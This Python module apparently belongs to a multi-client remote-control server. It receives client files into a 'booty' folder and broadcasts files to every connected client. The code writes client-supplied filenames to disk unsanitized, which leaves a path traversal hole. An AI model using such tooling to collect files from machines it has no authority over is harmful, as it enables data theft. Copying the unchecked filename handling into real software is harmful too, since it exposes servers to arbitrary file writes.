import os
from .common import recv_exact, CHUNK_SIZE


def receive_file_from_client(sock, header, dest_dir="booty"):
    """Receive a file from client. Header is already received."""
    parts = header.split()
    
    if len(parts) != 3 or parts[0] != "FILE":
        raise ValueError(f"Invalid FILE header: {header}")

    filename = parts[1]
    size = int(parts[2])
    
    print(f"[*] Receiving file: {filename} ({size} bytes)")

    os.makedirs(dest_dir, exist_ok=True)
    dest_path = os.path.join(dest_dir, filename)
    
    # Receive the file data
    file_data = recv_exact(sock, size)
    
    with open(dest_path, "wb") as f:
        f.write(file_data)
    
    return filename, size, dest_path


def send_file(sock, filepath):
    """Send a file to client."""
    if not os.path.isfile(filepath):
        raise FileNotFoundError(f"File not found: {filepath}")

    size = os.path.getsize(filepath)
    name = os.path.basename(filepath)

    sock.sendall(f"FILE {name} {size}\n".encode())
    
    with open(filepath, "rb") as f:
        while chunk := f.read(CHUNK_SIZE):
            sock.sendall(chunk)
    
    print(f"[+] File sent to client: {name}")


def broadcast_sendfile(base_dir, record_transfer_callback):
    """Send file to all clients."""
    from .sessions import get_all_clients
    from .common import choose_file_to_send
    
    filename = choose_file_to_send(base_dir)
    if not filename:
        return
    
    full_path = os.path.join(base_dir, filename)
    size = os.path.getsize(full_path)
    
    for cid, sock in get_all_clients():
        try:
            send_file(sock, full_path)
            record_transfer_callback(cid, "send", filename, size)
            print(f"[+] File sent to client {cid}")
        except Exception as e:
            print(f"[!] Error sending file to client {cid}: {e}")